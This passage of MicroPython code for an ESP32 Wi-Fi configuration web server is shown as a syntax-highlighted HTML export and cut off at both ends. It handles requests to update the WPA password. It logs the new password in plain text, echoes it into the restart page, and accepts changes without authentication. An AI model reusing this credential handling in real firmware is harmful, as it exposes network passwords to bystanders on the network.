timeout.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">return</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;OSError </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Socket receive error: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">return</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; request_decoded = request_bytes.decode(</span><span class="c5">&#39;utf-8&#39;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;UnicodeError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Could not decode request as UTF-8.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nBad Request: Invalid encoding&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">pass</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">return</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Received Request:&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(request_decoded) &nbsp;</span><span class="c9"># Debug print (you can comment this out later)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; request_lines = request_decoded.split(</span><span class="c5">&#39;\r\n&#39;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; request_line = request_lines[</span><span class="c6">0</span><span class="c0">]</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c3">not</span><span class="c1">&nbsp;request_line: </span><span class="c9"># Handle empty requests after receiving some data</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># print(&quot;Received empty request line.&quot;) # Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">return</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; method, path, protocol = request_line.split(</span><span class="c5">&#39; &#39;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(f&quot;Parsed: Method={method}, Path={path}, Protocol={protocol}&quot;) # Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;ValueError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">&quot;Malformed request line.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nBad Request: Malformed request line&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">pass</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">return</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; message = </span><span class="c5">&quot;&quot;</span><span class="c1">&nbsp;</span><span class="c9"># Message to display on the page</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;method == </span><span class="c5">&#39;GET&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c5">&#39;?&#39;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c0">&nbsp;path:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; path, query_string = path.split(</span><span class="c5">&#39;?&#39;</span><span class="c1">, </span><span class="c6">1</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Correct parsing of query string parameters using string split</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; params = {}</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">for</span><span class="c1">&nbsp;param </span><span class="c3">in</span><span class="c1">&nbsp;query_string.split(</span><span class="c5">&#39;&amp;&#39;</span><span class="c0">):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c5">&#39;=&#39;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c0">&nbsp;param:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key, value = param.split(</span><span class="c5">&#39;=&#39;</span><span class="c1">, </span><span class="c6">1</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Basic URL decoding (replace &#39;+&#39; with space)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; params[key] = value.replace(</span><span class="c5">&#39;+&#39;</span><span class="c1">, </span><span class="c5">&#39; &#39;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(f&quot;Parsed GET params: {params}&quot;) # Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c5">&#39;status&#39;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c0">&nbsp;params:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; status = params[</span><span class="c5">&#39;status&#39;</span><span class="c0">]</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;status == </span><span class="c5">&#39;success&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; message = </span><span class="c5">&quot;WPA Password updated successfully! (Device restarted)&quot;</span><span class="c1">&nbsp;</span><span class="c9"># Message reflects new flow</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">elif</span><span class="c1">&nbsp;status == </span><span class="c5">&#39;short_password&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; message = </span><span class="c5">&quot;Error: Password must be at least 8 characters long.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">elif</span><span class="c1">&nbsp;status == </span><span class="c5">&#39;no_password&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;message = </span><span class="c5">&quot;Error: No valid password received.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">elif</span><span class="c1">&nbsp;status == </span><span class="c5">&#39;save_error&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;message = </span><span class="c5">&quot;Error: Could not save the new password. Check filesystem.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; message = </span><span class="c5">&quot;Unknown status.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(f&quot;Status message set: {message}&quot;) # Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;path == </span><span class="c5">&#39;/&#39;</span><span class="c1">&nbsp;</span><span class="c3">or</span><span class="c1">&nbsp;path == </span><span class="c5">&#39;/index.html&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; html_content = config_webpage_html(message)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 200 OK\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Content-Type: text/html\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">f&quot;Content-Length: </span><span class="c15">{</span><span class="c10">len</span><span class="c15">(html_content)}</span><span class="c5">\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Connection: close\r\n\r\n&quot;</span><span class="c1">) </span><span class="c9"># Close after sending</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(html_content)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(&quot;Config page sent.&quot;) # Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Path not found</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;GET Path not found: </span><span class="c15">{path}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nNot Found&quot;</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">elif</span><span class="c1">&nbsp;method == </span><span class="c5">&#39;POST&#39;</span><span class="c1">&nbsp;</span><span class="c3">and</span><span class="c1">&nbsp;path == </span><span class="c5">&#39;/update_password&#39;</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Find the body of the request (after the double CRLF)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; body_start = request_decoded.find(</span><span class="c5">&#39;\r\n\r\n&#39;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; body = </span><span class="c5">&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;body_start != -</span><span class="c6">1</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; body = request_decoded[body_start + </span><span class="c6">4</span><span class="c1">:] </span><span class="c9"># Get data after headers</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Correct parsing of the body using string split</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; password_data = {}</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">for</span><span class="c1">&nbsp;part </span><span class="c3">in</span><span class="c1">&nbsp;body.split(</span><span class="c5">&#39;&amp;&#39;</span><span class="c0">):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c5">&#39;=&#39;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c0">&nbsp;part:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key, value = part.split(</span><span class="c5">&#39;=&#39;</span><span class="c1">, </span><span class="c6">1</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Basic URL decoding (replace &#39;+&#39; with space)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; password_data[key] = value.replace(</span><span class="c5">&#39;+&#39;</span><span class="c1">, </span><span class="c5">&#39; &#39;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(f&quot;Parsed POST body data: {password_data}&quot;) # Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new_password = password_data.get(</span><span class="c5">&#39;new_password&#39;</span><span class="c1">, </span><span class="c5">&#39;&#39;</span><span class="c1">) </span><span class="c9"># Use .get with default for safety</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;new_password </span><span class="c3">and</span><span class="c1">&nbsp;</span><span class="c10">len</span><span class="c1">(new_password) &gt;= </span><span class="c6">8</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Attempting to save new password: </span><span class="c15">{new_password}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c0">&nbsp;save_password(new_password):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Password saved successfully. Now send restart page and reset.</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Password saved successfully. Preparing for restart.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># --- MODIFICADO: Pasar la nueva password a la p&aacute;gina de reinicio ---</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; restarting_html_content = restarting_webpage_html(new_password=new_password, seconds=</span><span class="c6">7</span><span class="c1">) </span><span class="c9"># Use slightly longer delay in HTML</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># --- FIN MODIFICACION ---</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Send the restarting page HTML</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 200 OK\r\n&quot;</span><span class="c1">) </span><span class="c9"># Send 200 OK for the restart page</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Content-Type: text/html\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">f&quot;Content-Length: </span><span class="c15">{</span><span class="c10">len</span><span class="c15">(restarting_html_content)}</span><span class="c5">\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Connection: close\r\n\r\n&quot;</span><span class="c1">) </span><span class="c9"># Close connection after sending response</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(restarting_html_content)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(&quot;Restart page sent.&quot;) # Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Give the client time to receive the response AND filesystem to sync</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Waiting before initiating restart (3 seconds)...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(</span><span class="c6">3</span><span class="c1">) </span><span class="c9"># Increased delay to 3 seconds</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Initiating machine.reset()...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; machine.reset() </span><span class="c9"># Restart the ESP32</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># The script execution stops here.</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Error saving - redirect to config page with error status</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Save password failed.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 303 See Other\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Location: /?status=save_error\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Connection: close\r\n\r\n&quot;</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">elif</span><span class="c1">&nbsp;new_password </span><span class="c3">and</span><span class="c1">&nbsp;</span><span class="c10">len</span><span class="c1">(new_password) &lt; </span><span class="c6">8</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># Password too short - redirect</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Received password too short.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 303 See Other\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Location: /?status=short_password\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Connection: close\r\n\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># No password received - redirect</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;No password data in POST request body.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 303 See Other\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Location: /?status=no_password\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;Connection: close\r\n\r\n&quot;</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># No body found in POST - Bad Request</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;No request body found in POST.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; 